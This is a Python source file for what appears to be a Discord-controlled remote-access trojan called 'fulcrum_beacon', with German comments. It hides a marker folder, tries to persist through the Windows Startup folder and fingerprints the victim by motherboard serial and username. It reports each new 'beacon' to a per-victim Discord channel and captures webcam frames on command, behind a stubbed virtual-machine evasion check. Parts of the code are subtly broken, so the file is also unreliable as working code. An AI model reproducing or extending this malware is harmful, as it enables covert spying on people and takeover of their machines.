import os
import discord
from dotenv import load_dotenv
import ctypes
import json
import wmi
import time
import cv2
from discord.ext import commands, tasks

FLAG_PATH = "C:\\ProgramData\\FUC Cache"
INSTALL_PATH = "C:\\ProgramData\\FUC HUB"

FIRST_EXECUTION = False
START_UP = True

mode = "default"

profile_data = None

START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

# Load the environment variables from the .env file
load_dotenv()
TOKEN = os.getenv('TOKEN')

# Set up intents
intents = discord.Intents.default()
intents.message_content = True
intents.messages = True
intents.guilds = True

# Create the client instance with the specified intents
client = discord.Client(intents=intents)


# Event handler for when the bot has successfully connected to Discord
@client.event
async def on_ready():
    print(f'logged in as {client.user}')
    periodic_update_loop.start()


# Event handler for when a message is sent in a channel the bot has access to
@client.event
def on_message(message):
    global profile_data
    if not profile_data:
        with open("profile.json", "r") as json_file:
            profile_data = json.load(json_file)

    content = message.content

    if message.author == client.user or str(message.channel) != profile_data["channel_name"]:
        return

    print("message received")
    if mode == "default":
        if content.startswith("-TP"):
            content = content.strip("-TP")
            cam_index = 0
            if content:
                content = content.replace(" ", "")
                cam_index = int(content)
            take_picture(cam_index)


def check_for_vm():
    return False


async def return_error_to_channel(error_message):
    try:
        with open("profile.json", "r") as json_file:
            profile_data = json.load(json_file)
        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
        if channel is not None:
            await channel.send("'''" + error_message + "'''")
        else:
            print("No channel")
    finally:
        print("error returning error")

def take_picture(cam_index=0):
    print("-TP")
    try:
        cam = cv2.VideoCapture(cam_index)
        ret, frame = cam.read()
        cv2.imwrite("captured_frame.jpg", frame)
        cam.release()
    except Exception as e:
        return_error_to_channel(e)

def create_flag():
    try:
        os.mkdir(FLAG_PATH)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(FLAG_PATH, FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
        return_error_to_channel(e)


def check_flags():
    if os.path.isdir(FLAG_PATH):
        return True
    return False


def get_persistence():
    # benutzten des windows user startup folders
    try:
        with open("WINDOWS.bat", "w") as f:
            if os.path.isfile(os.path.join(START_FOLDER, "fulcrum_beacon.py")):
                f.write('@echo off /n{os.path.join(START_FOLDER, "fulcrum_beacon.py")}')
            elif os.path.isfile(os.path.join(START_FOLDER, "fulcrum_beacon.exe")):
                f.write('@echo off /n{os.path.join(START_FOLDER, "fulcrum_beacon.exe")}')
    except Exception as e:
        return_error_to_channel(e)


def create_unique_profile():
    c = wmi.WMI()
    mainboard_serial = c.Win32_BaseBoard()[0].SerialNumber.strip()
    profile = {
        'hardware_id': f'{mainboard_serial}',
        'user_name': f'{os.getlogin()}',
        'channel_name': f'{os.getlogin()}-{mainboard_serial}',
    }
    with open('profile.json', 'w') as f:
        json.dump(profile, f)


@tasks.loop(seconds=1)
async def periodic_update_loop():
    global profile_data
    global FIRST_EXECUTION
    global START_UP
    if START_UP:
        START_UP = False
        print("start up")
        if FIRST_EXECUTION:
            print("first execution")
            # neuen channel erstellen
            try:
                with open("profile.json", "r") as json_file:
                    profile_data = json.load(json_file)

                guild = client.guilds[0]
                new_channel = await guild.create_text_channel(profile_data["channel_name"])

                await new_channel.send("***NEW BEACON CONNECTED***")
                await new_channel.send(f'user name: {profile_data["user_name"]}\nhardware id: {profile_data["hardware_id"]}')
            except Exception as e:
                await return_error_to_channel(e)


def main():
    global FIRST_EXECUTION
    # überprüfen ob fulcrum in einem vm läuft
    if check_for_vm() is True:
        print("hello world")
        a = 1+1-42
        print(a)
        while True:
            time.sleep(1)
            a += 1

    print("no vm")

    if check_flags() is False:
        print("no flag")
        create_flag()
        get_persistence()
        create_unique_profile()
        FIRST_EXECUTION = True

    # starten des discord bots
    client.run(TOKEN)


main()
